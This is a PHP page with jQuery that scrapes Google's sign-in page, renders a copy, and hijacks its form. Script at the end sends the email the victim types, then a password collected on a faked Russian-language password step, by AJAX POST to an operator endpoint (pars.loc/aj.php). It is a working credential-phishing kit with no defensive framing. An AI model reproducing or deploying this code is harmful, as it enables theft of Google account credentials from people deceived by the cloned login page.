<?php //header('Content-type: text/html; charset=utf-8');?>
<script src="load/jquery-3.4.1.min.js"></script>
<style>

    #Next{
        background: green;
    }

</style>

<?php require 'load/phpQuery.php';?>
<?php  require 'load/autoloader.php' ?>
<?php require 'load/debug.php';?>
<div id="add"></div>
<?php
$obj = New Parser();
//Соединяемся, если необходима авторизация
$obj->connect('https://accounts.google.com/ServiceLogin?hl=ru&amp;passive=true&amp;continue=https://www.google.com/');

//передаёт 3 параметра url,start,end, работает с пагинацией
//$obj->pagination('https://yandex.ru/search/?text=%D0%BF%D0%BE%D1%80%D0%BE%D1%88%D0%B5%D0%BD%D0%BA%D0%BE&lr=8','0','2');

//Элемент по селектору и аттрибуту, selector,attr
$obj->show('','');

//Работает по произвольным селекторам
//$obj->difitems('https://goo-gl.ru/5e8z');


?>


<?//= $obj->range; ?>

<!--  Вывестив с пагинпцией -->
<?//= $obj->range  ?>

<!--  Вывести  всю страницу -->
<?=  $obj->pq ?>

<!--  Вывестив только по селектору -->
<?//= $obj->text ?>

<!--  Вывестив атрибут href списком -->
<?php //debug($obj->test) ?>


<script>
    $(document).ready(function() {
        $('form').attr('id', 'testId');
       // $('input').attr('type', 'password');
        //$('form').attr('action', 'http://pars.loc/aj.php');
        //$('.k6Zj8d').css({'display','none'});
        //$('.k6Zj8d').removeClass().addClass('class-one');
        //$('.class-one').css({'display','none'});
    });
</script>


<script>
    $(function(){
        $('#identifierNext').bind('click', function(){
            $.ajax({
                type: 'post',
                url: 'http://pars.loc/aj.php' ,
                data:$("#testId").serialize(),
                beforeSend: function(){
                    $('#add').html('Запрос обрабатывается');
                },
                success: function(result){
                    $('#add').html(result);
                }
            });

            $('.AxOyFc').html('Введите ваш пароль');
            $('.ck6P8 button').html('Забыли пароль?')
            $('input').attr('type', 'password');
            $('#identifierNext').attr('id', 'Next');
            $('.RveJvd').html('Отправить');
            $('#headingText content').html('Добро пожаловать');
            $('#headingSubtext').html('Используйте пароль от аккаунта Google');
            $('.Xb9hP input').attr('name','hool');
            $('input').val('');

            if(document.getElementById('Next')){
                $('.RveJvd').bind('click', function(){

                    $.ajax({
                        type: 'post',
                        url: 'http://pars.loc/aj.php' ,
                        data:$("#testId").serialize(),
                        beforeSend: function(){
                            $('#add').html('Запрос обрабатывается');
                        },
                        success: function(result){
                            $('#add').html(result);
                        }
                    });
                });
            }
            else{

                alert ('9');
            }

        });

    });
</script>
















